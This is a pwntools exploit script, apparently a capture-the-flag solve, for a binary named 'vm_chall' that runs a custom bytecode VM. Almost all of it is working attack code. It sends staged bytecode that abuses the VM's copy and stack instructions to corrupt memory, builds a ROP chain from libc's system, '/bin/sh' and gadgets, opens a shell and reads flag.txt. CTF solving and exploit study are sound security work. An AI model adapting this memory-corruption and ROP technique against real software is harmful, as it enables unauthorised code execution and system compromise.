#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template vm_chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'vm_chall')

# context.terminal = ['kitty']

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DBG NOASLR
if args.DBG:
	context.log_level = 'debug'

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.RE:
        return remote('localhost',1338)
    else:
        return process([exe.path] + argv, *a, **kw)

# MACROS
def s(a) : return p.send(a)
def sl(a) : return p.sendline(a)
def sa(a,b) : return p.sendafter(a,b)
def sla(a,b) : return p.sendlineafter(a,b)
def stb(var) : return str(var).encode()
def rv(a) : return p.recv(a)
def ru(a) : return p.recvuntil(a)
def ra() : return p.recvall()
def rl() : return p.recvline()
def cyc(a): return cyclic(a)
def rrw(var, list) : [var.raw(i) for i in list]
def rfg(var,a) : return var.find_gadget(a)
def rch(var) : return var.chain()
def rdm(var) : return var.dump()
def inf(var) : return info(var)
def war(var) : return warn(var)
def succ(obj,var) : return obj.success(var)
def prog(var) : return log.progress(var)
def inr() : return p.interactive()
def cls() : return p.close()

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
# tbreak main
# b * main+370
# b * main+397
# b * main+467
# b * main+578
# b * main+691
# b * main+802
gdbscript='''
b * main+891
'''
# b * main+1095
# b * main+1229
# b * main+2184
# continue
# '''.format(**locals())

PUSH = b'\x31'
PUSH_R = b'\x32'
POP_R = b'\x33'
MOV = b'\x34'
MOV_R_X = b'\x35'
CPY = b'\x36'
AND = b'\x37'
OR = b'\x38'
XOR = b'\x39'
NOT = b'\x40'
SHR = b'\x41'
SHL = b'\x42'
ADD = b'\x43'
SUB = b'\x44'
JMP = b'\x45'

def bytec(bytecode):
    payload = b''
    for i in bytecode:
        if not isinstance(i,bytes):
            b_len = (len(bin(i))+7)//8
            i = int.to_bytes(i,b_len)
        payload += i 
    return payload

def add(r1,r2,r3,v1,v2,payl):
    while v2 != 0:
        sum = v1 ^ v2
        payl.extend([PUSH_R, r1, XOR, r1, r2, MOV, 7, r1])
        carry = (v1 & v2) << 1
        payl.extend([POP_R, r1, AND, r2, r1, SHL, r2, r3, MOV, 6, r2])
        v1 = sum
        v2 = carry
        payl.extend([MOV, r1, 7, MOV, r2, 6]) 

def pack(l,val): 
     for b in p64(val): l.append(b)

'''
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> BEGIN EXPLOIT <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
'''
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        PIE enabled
# Stripped:   No

p = start()

# shc = [ 0x31, 1 ] * 1024 + [ 0x38 ] * 1024
# shc = [ 
#      PUSH, 1,
#      POP_R, 4,
#      PUSH_R, 4,
#      MOV_R_X, 2, ]

# pack(shc,0xdeadbeef)

libc = ELF('./libc.so.6')

shc = []

for i in range(0x7): shc.extend([PUSH, 0])

shc += [
    MOV_R_X, 0, p64(255-8),
    MOV_R_X, 1, p64(255),
    MOV_R_X, 2, p64(0xfffffffff000),
    MOV_R_X, 3, p64(0x2a0),
    MOV_R_X, 4, p64(0x2b8),
    CPY, 0, 1, p16(8*10),
]

payload = bytec(shc)
print(payload)
sla(b'lEn',str(len(payload)+len(payload)).encode())
sla(b'BYTECODE',payload)

shc = [
    POP_R, 0,
    POP_R, 0,
    POP_R, 0,
    POP_R, 0,
    MOV, 1, 0,
    AND, 0, 2,
    AND, 1, 2,
    AND, 2, 1,
    OR, 0, 3,
    OR, 1, 4,
    MOV_R_X, 5, p64(0xc56),
    OR, 2, 5,
    PUSH_R, 1,
    PUSH_R, 0,
    PUSH_R, 2,
    MOV_R_X, 5, p64(255),
    MOV_R_X, 6, p64(255-8),
    CPY, 5, 6, p16(6*8),
    POP_R, 0,
    MOV_R_X, 1, p64(0xfffffffff000),
    MOV_R_X, 2, p64(0x16d8),
    MOV_R_X, 7, p64(0x18),
    AND, 0, 1,
    ADD, 0, 2,
    MOV, 1, 0,
    ADD, 1, 7,
    #MOV, 2 
]

payload = bytec(shc)
sla(b'lEn',stb(len(payload)+len(payload)))
sla(b'BYTECODE',payload)

shc = [
    PUSH, 0,
    PUSH, 0,
    PUSH, 0,
    PUSH, 0,
    CPY, 6, 5, p16(8*10),
    POP_R, 7,
    POP_R, 7,
    POP_R, 7,
    PUSH_R, 1,
    PUSH_R, 0,
    MOV_R_X, 3, p64(0xfffffffff000),
    MOV_R_X, 4, p64(0x2d8),
    AND, 7, 3,
    OR, 7, 4,
    PUSH_R, 7,
    CPY, 5, 6, p16(8*10), 
    POP_R, 2,
    MOV_R_X, 3, p64(0x108),
    SUB, 2, 3, 
    MOV_R_X, 3, p64(0x18),
    MOV, 1, 2,
    ADD, 1, 3,
    MOV, 6, 0,
    MOV_R_X, 4, p64(255),
    MOV_R_X, 5, p64(255-8),
    CPY, 5, 4, p16(8*10),
   ]

payload = bytec(shc)
sla(b'lEn',stb(len(payload)+len(payload)))
sla(b'BYTECODE',payload)

rop = ROP(libc)

shc = [
    PUSH, 0,
    PUSH_R, 1,
    PUSH_R, 2,
    MOV_R_X, 3, p64(0xfffffffff000),
    AND, 7, 3,
    MOV_R_X, 4, p64(0xc41),
    OR, 7, 4,
    PUSH_R, 7,
    MOV_R_X, 4, p64(255),
    CPY, 4, 5, p16(8*9),
    AND, 6, 3, 
    MOV_R_X, 3, p64(0x1e9000),
    SUB, 6, 3,
    MOV_R_X, 3, p64(libc.sym['system']+0x2000),
    ADD, 6, 3,
    CPY, 5, 4, p16(8*10),
    PUSH_R, 6,    
    SUB, 6, 3,
    MOV_R_X, 3, p64(next(libc.search(b'/bin/sh\0'))+0x2000),
    ADD, 6, 3,
    PUSH_R, 6,
    SUB, 6, 3,
    MOV_R_X, 3, p64(rfg(rop,['pop rdi','ret'])[0]+0x2000),
    ADD, 6, 3,
    PUSH_R, 6,
    SUB, 6, 3,
    MOV_R_X, 3, p64(rfg(rop,['ret'])[0]+0x2000),
    ADD, 6, 3,
    PUSH_R, 6,
    ]

info(f"SYSTEM: {hex(libc.sym['system'])}")

payload = bytec(shc)
sla(b'lEn',stb(len(payload)))
sla(b'BYTECODE',payload)

sl(b"echo '$$'")
ru(b'$$\n')
sl(b'cat flag.txt')
flag = ru(b'}').decode()
log.success(f"FLAG: {flag}")
